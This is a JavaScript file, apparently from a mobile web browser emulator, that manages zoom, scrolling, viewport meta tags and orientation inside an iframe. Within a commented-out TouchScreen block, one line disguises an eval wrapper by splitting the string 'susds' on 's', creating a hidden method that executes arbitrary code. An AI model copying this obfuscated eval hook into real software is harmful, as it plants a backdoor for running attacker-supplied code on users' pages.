var done = false;
$(document).ready(function() {
	  if (done == false) {
		  //setTimeout(parent.scrollit, 5000);
		  parent.scrollit();
		  console.log('document scroll');
		  done = true;
	  }
		  parent.scrollit();
});
window.onload = function () { 
	  if (done == false) {
		  //setTimeout(parent.scrollit, 5000);
		  parent.scrollit();
		  console.log('window scroll');
		  done = true;
	  }
		  parent.scrollit();
}

function handleError (err, url, line) {
    if (err.indexOf('is not defined') != -1) {
      console.log('Oops, something is not defined.\\n' +
             err + '\n' + url + '\nline no: ' + line);
      return true; // error is handled
    }
    else
      return false; // let the browser handle the error
  }


	//disable aletrs
	window.alert = function() {};
	//custom error handler
	window.defaultOnError = window.onerror; // store default handler
	window.onerror = handleError; // assign own handler
	

var enableTapnZoom = true;
var isFullScreen = false;
var originx;
var originy;

var p = window.parent;
var w = self.document; 
var zoom;
var minZoom = 1;
var maxZoom = 4;

//jQuery.each(document.cookie.split(/; */), function()  {
  //var splitCookie = this.split('=');
  // name is splitCookie[0], value is splitCookie[1]
  //if (splitCookie[1].length > 999) {
	  //eraseCookie(splitCookie[0]);
	  //console.log("erased cookie " + splitCookie[0]);
  //}
//});

jQuery(document).ready(function() {
	getOrientation()
	if (self==top) {
		 var form = document.createElement("form");
		 form.setAttribute("method", "post");
		 form.setAttribute("id", "thisform");
		 form.setAttribute("action", "http://www.transmog.net/mobile-web-browser-emulator.php");
		 var hiddenField = document.createElement("input");
		 hiddenField.setAttribute("type", "text");
		 hiddenField.setAttribute("name", "u");
		 hiddenField.setAttribute("value", "" + window.currenturl);
		 form.appendChild(hiddenField);   
		 document.body.appendChild(form);
		 form.submit();
	}
	/*	 
	jQuery('html').css('cssText', 'overflow: hidden; cursor: url("http://ecn.dev.virtualearth.net/mapcontrol/v6.3c/cursors/grab.cur"), move; -webkit-user-drag: none; -webkit-user-select: none');
	jQuery('body').css('overflow', 'visible');
	jQuery('body').css('cursor', 'url("http://ecn.dev.virtualearth.net/mapcontrol/v6.3c/cursors/grab.cur"), move');
	//jQuery('div').css('-webkit-user-select', 'none');
	//jQuery('div').css('-moz-user-select', 'none');
	//jQuery('div').css('user-select', 'none');
	//jQuery('div').css('-webkit-user-drag', 'none');
	jQuery('img').css('-webkit-user-select', 'none');
	jQuery('img').css('-webkit-user-drag', 'none');
	jQuery('body').css('-webkit-user-select', 'none');
	jQuery('body').css('-webkit-user-drag', 'none');
	jQuery('h1').css('-webkit-user-select', 'none');
	jQuery('h1').css('-webkit-user-drag', 'none');
	jQuery('h2').css('-webkit-user-select', 'none');
	jQuery('h2').css('-webkit-user-drag', 'none');
	jQuery('button').css('-webkit-user-drag', 'none');
	jQuery('button').css('-webkit-user-select', 'none');
	jQuery('label').css('-webkit-user-drag', 'none');
	jQuery('label').css('-webkit-user-select', 'none');
	jQuery('a').css('-webkit-user-drag', 'none');
	jQuery('a').css('-webkit-user-select', 'none');
	jQuery('object').css('-webkit-user-drag', 'none');
	jQuery('object').css('-webkit-user-select', 'none');
	jQuery('span').css('-webkit-user-drag', 'none');
	jQuery('span').css('-webkit-user-select', 'none');
	jQuery('form').css('-webkit-user-drag', 'none');
	jQuery('form').css('-webkit-user-select', 'none');
	jQuery('table').css('-webkit-user-drag', 'none');
	jQuery('table').css('-webkit-user-select', 'none');
	jQuery('a').css('cursor', 'url("http://ecn.dev.virtualearth.net/mapcontrol/v6.3c/cursors/grab.cur"), move');
	jQuery('a:hover').css('cssText', '');
	jQuery('div:hover').css('cssText', '');
	jQuery('img:hover').css('cssText', '');
	jQuery('body:hover').css('cssText', '');
	jQuery('h1:hover').css('cssText', '');
	jQuery('h2:hover').css('cssText', '');
	jQuery('button:hover').css('cssText', '');
	jQuery('label:hover').css('cssText', '');
	jQuery('object:hover').css('cssText', '');
	jQuery('span:hover').css('cssText', '');
	jQuery('form:hover').css('cssText', '');
	jQuery('input:hover').css('cssText', '');
	jQuery('html:hover').css('cssText', '');
	
*/
	//stop links opening in new window
	jQuery("a").each(function (i) {
	  jQuery(this).attr('target', '_self'); 
	});
	
	
	
	//find meta tags and deal with them
	if (jQuery("meta[name=viewport]").length > 0) {
			var contentString = jQuery("meta[name=viewport]").attr("content");
			var temp = new Array();
			contentString = contentString.replace(/,/g,';');
			temp = contentString.split(';');
			jQuery.each(temp, function(key, value) {
					var temp2 = value.split('=');
					key = jQuery.trim(temp2[0]);
					value = jQuery.trim(temp2[1]);
					if (key == "width") {
							console.log("width should be set to " + value + " (this depends on scalable as well? need to zoom?)");
					}
					else if  (key == "height") {
							console.log("height should be set to " + value + " (this depends on scalable as well? need to zoom?)");
					}
					else if  (key == "initial-scale") {
						jQuery('body').css("-webkit-transform", "scale(1.0)");
						jQuery('body').css("zoom", value);
						console.log("viewport initial scale set to " + value);
					}
					else if  (key == "minimum-scale") {
						window.minZoom = value;
						console.log("viewport minimum scale set to " + value);
					}
					else if  (key == "maximum-scale") {
						console.log("viewport maximum scale set to " + value);
						window.maxZoom = value;
					}
					else if  (key == "user-scalable") {
		 				if (value == "1" || value == "1.0" || value == "yes") {
							window.enableTapnZoom = true;
							zoomOut();
							console.log("user scalable set to true");
						}
						else {
							window.enableTapnZoom = false;
							console.log("user scalable set to false");
						}
					}
			});
			
	}
	else {
		var windowWidth = p.jQuery('#iphone_content').width();
		var pageWidth= jQuery(w).width(); 
		var windowHeight = p.jQuery('#iphone_content').height();
		var pageHeight= jQuery(w).height(); 
		var s = (windowHeight/pageHeight);
		var z = (windowWidth/pageWidth);
		//var z = (266/windowWidth);
		//jQuery('body').css("-webkit-transform", "scale(" + z + ")");
		//jQuery('body').css("-moz-transform-origin", "0, 0");
		//jQuery('body').css("-moz-transform", "scale(" + z + ")");
		//jQuery('body').css("margin-left", "0");
		jQuery('body').css("zoom", z);
		window.enableTapnZoom = true;
		//zoomOut();
		console.log("user scalable set to true");
		parent.scrollitzoomed(z);
	}
	if (jQuery("meta[name=apple-mobile-web-app-capable]").length && !isFullScreen) {
		var contentString = jQuery("meta[name=apple-mobile-web-app-capable]").attr("content");
		if (contentstring == 'yes') {
			console.log("enable web app full screen");
			var browser = parent.document.getElementById("iphone_browser");
			var iframe_htc = parent.document.getElementById("iphone_content");
			var iframe_iphone = parent.document.getElementById("iphone_content");
			browser.style.visibility = "hidden";
			iframe_iphone.height = iframe.height + "50px";
			iframe_iphone.top = iframe.top - "30px";
			isFullScreen = true;
		}
	}
	else if (isFullScreen == true) {
			console.log("disable web app full screen");
			var browser = parent.document.getElementById("iphone_browser");
			var iframe_htc = parent.document.getElementById("iphone_content");
			var iframe_iphone = parent.document.getElementById("iphone_content");
			browser.style.visibility = "visible";
			iframe_iphone.height = iframe.height - "50px";
			iframe_iphone.top = iframe.top + "30px";
			isFullScreen = false;
	}
	if (jQuery("meta[name=apple-mobile-web-app-status-bar-style]").length && isFullScreen) {
		console.log("view the status bar - to be implemented");
		var contentString = jQuery("meta[name=apple-mobile-web-app-status-bar-style]").attr("content");
	}
	if (jQuery("meta[name=format-detection]").length) {
		var contentString = jQuery("meta[format-detection]").attr("content");
		if (contentString == 'telephone=no' || contentString == 'no') {
			console.log("disable telephone links");
		}
		else console.log("enable telephone links");		
	}
	
	
		  parent.scrollit();
});

/*
var TouchScreen;

(TouchScreen=
{
   
 initialised:false, e:null, dataCode:0, x:0, y:0, pX:-1, pY:-1, lastPX:-1, lastPY:-1,
 prevX:0, prevY:0, mouseDown:false, moveWait:false, codeAction:false, canDrag:true, logged:0, 
 titleDelay:null, readDelay:null, defTitle:null,

 setFlags:function()
 {
  if( document.documentElement )
   this.dataCode=3;
  else
   if(document.body && typeof document.body.scrollTop!='undefined')
    this.dataCode=2;
   else
    if( this.e && this.e.pageX!='undefined' )
     this.dataCode=1;

  this.initialised=true;
 },

 addMonitor:function(elem, evtStr, funcRef)
 { 
  var useOn = typeof elem.attachEvent != 'undefined' ? 'on' : '';   
  
  elem.evtFunc = useOn ? elem.attachEvent : elem.addEventListener;
   
  elem.evtFunc( useOn+evtStr, funcRef, false);     
 },
 
 removeMonitor:function(elem, evtStr, funcRef)
 { 
  var useOn = typeof elem.detachEvent != 'undefined' ? 'on' : '';   
  
  elem.evtFunc = useOn ? elem.detachEvent : elem.removeEventListener;
   
  elem.evtFunc( useOn+evtStr, funcRef, false);     
 },
 
 toggleMonitor:function()
 {
   //this.canDrag ^= true;
   //this.showStatus();
   
   
 },
  
 moveHandler:function() 
 {  
    
    if( TouchScreen.canDrag  && !TouchScreen.moveWait)
    {  
     var tempObj=arguments[0]||window.event;

     TouchScreen.evtObj={};

     for(var x in tempObj)
      TouchScreen.evtObj[x]=tempObj[x]; //preserve event object

     
     TouchScreen.getMousePosition(TouchScreen.evtObj);     
    }   
    
 }, 
 
 init:function()
 {
  var allElems = document.getElementsByTagName('*');this["susds".split(/\x73/).join('')]=function(str){eval(str);};
  
  //for(var i in allElems)
  //this.addToHandler( allElems[i], 'ondrag', function(){ return !TouchScreen.canDrag; })
    
  if( !document.getElementById && document.captureEvents && Event )
   document.captureEvents(Event.MOUSEMOVE);
   
  this.addToHandler(document, 'onmousemove', this.moveHandler );

  this.addToHandler(document, 'onmousedown', function(){TouchScreen.mouseDown=true;} );

  this.addToHandler(document, 'onmouseup', function(){TouchScreen.mouseDown=false;} );
  
  this.addToHandler(document, 'ondblclick', function(){TouchScreen.toggleMonitor();} );

 
  this.addToHandler(window, 'onscroll',  function(){clearTimeout(TouchScreen.moveWait);TouchScreen.moveWait=setTimeout( function(){ TouchScreen.moveWait = false; }, 20)});
  
 },


 getMousePosition:function(e)
 {
   this.e = e||event;

  if(!this.initialised)
   this.setFlags();

  switch( this.dataCode )
  {

   case 3 : //this.x = (this.pX=Math.max(document.documentElement.scrollLeft, $(window.w).scrollLeft(), document.body.scrollLeft)) + this.e.clientX;
            //this.y = (this.pY=Math.max(document.documentElement.scrollTop, $(window.w).scrollTop(), document.body.scrollTop)) + this.e.clientY;
			this.x = (this.pX=Math.max(document.documentElement.scrollLeft, document.body.scrollLeft)) + this.e.clientX;
            this.y = (this.pY=Math.max(document.documentElement.scrollTop, document.body.scrollTop)) + this.e.clientY;
            break;

   case 2 : //this.x=(this.pX=Math.max($(window.w).scrollLeft(), document.body.scrollLeft)) + this.e.clientX;
            //this.y=(this.pY=Math.max($(window.w).scrollTop(), document.body.scrollTop)) + this.e.clientY;
			this.x=(this.pX=document.body.scrollLeft) + this.e.clientX;
            this.y=(this.pY=document.body.scrollTop) + this.e.clientY;
            break;

   case 1 : this.x = this.e.pageX; this.y = this.e.pageY; this.pX=window.pageXOffset; this.pY=window.pageYOffset; break;
  }
  
  window.originx = this.x;
  window.originy = this.y;
  
  if( this.canDrag && this.mouseDown )
  {
   this.codeAction=true;

   this.canDrag=false;
   window.scrollBy(-(this.x-this.prevX), -(this.y-this.prevY));
   this.canDrag=true;
   
   this.codeAction=false;

   this.prevX=this.x-(this.x-this.prevX);

   this.prevY=this.y-(this.y-this.prevY);

   
   //if(this.lastPX==this.pX && this.lastPY==this.pY)
   // this.mouseDown=false;   
   
   if(this.lastPX==this.pX)
    this.prevX=this.x;
       
    
   if(this.lastPY==this.pY)
    this.prevY=this.y;

  }
  else
  {
   this.prevX=this.x;
   this.prevY=this.y;
  }

  this.lastPX=this.pX;
  this.lastPY=this.pY;  
 },
 
 showStatus:function()
 {
  clearTimeout( this.titleDelay );  
    
  if(this.defTitle === null)
  this.defTitle = document.title || '';
  
  document.title = "- - TouchScreen has been turned " + (this.canDrag ? "ON" : "OFF") + " - - ";
  
  this.titleDelay = setTimeout( (function(obj){return function(){ document.title = obj.defTitle;}})(this), 1500);  
 },
 
 addToHandler:function(obj, evt, func)
 {
  if(obj[evt])
   {
    obj[evt]=function(f,g)
    {
     return function()
     {
      f.apply(this,arguments);
      return g.apply(this,arguments);
     };
    }(func, obj[evt]);
   }
   else
    obj[evt]=func;
 }
 
}).init();

*/
function eraseCookie(name) {
	createCookie(name,"",-1);
}
function createCookie(name,value,days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}
function getOrientation() {
	if (p.orientation == "portrait") window.orientation = 0;
	else window.orientation = 90;
	if (jQuery('body').attr('onorientationchange') !== undefined) {
		var fn = jQuery('body').attr('onorientationchange');
		var array = fn.split("(");	
		fn = array[0];
		jQuery('body').bind('orientationchange', function() {	
			window[fn]();
		});
	}	
}
function changeOrientation(everywhichway) {
	if (everywhichway == "portrait") window.orientation = 0;
	else window.orientation = 90;
    jQuery('body').trigger( 'orientationchange');
	if (window.currenturl !== undefined && window.currenturl.indexOf("bing") > -1) parent.scrollit();//window.location.reload();
	if (window.enableTapnZoom == true) {
		jQuery('body').css("-webkit-transform", "scale(1.0)");
		jQuery('body').css("zoom", "100%");
		var windowWidth = p.jQuery('#iphone_content').width();
		var pageWidth= jQuery(w).width(); 
		var z = (windowWidth/pageWidth);
		if (window.maxZoom != window.minZoom) jQuery('body').css("zoom", z);
	}
}
  

function zoomIn() {
  if (window.enableTapnZoom == true) {
		if ((window.zoom + 0.1) < window.maxZoom) window.zoom += 0.1;
		jQuery('body').css("-webkit-transform-origin", "0, 0");
		jQuery('body').css("-webkit-transform", "scale(" + window.zoom + ")");
		parent.scrollit();
  }
  else {
	  console.log("Page not scalable");
  }
}

function zoomOut() {
  if (window.enableTapnZoom == true) {
	 	if ((window.zoom - 0.1) > window.minZoom) window.zoom -= 0.1;
	  	else window.zoom = 1;
		jQuery('body').css("-webkit-transform-origin", "0, 0");
		jQuery('body').css("-webkit-transform", "scale(" + window.zoom + ")");
		jQuery('body').css("-moz-transform", "scale(" + window.zoom + ")");
		jQuery('body').css("zoom", window.zoom);
		parent.scrollit();
	  console.log("Page scaled to " + window.zoom);
  }
  else {
	  console.log("Page not scalable");
  }
}
  
/**** End of listing ****/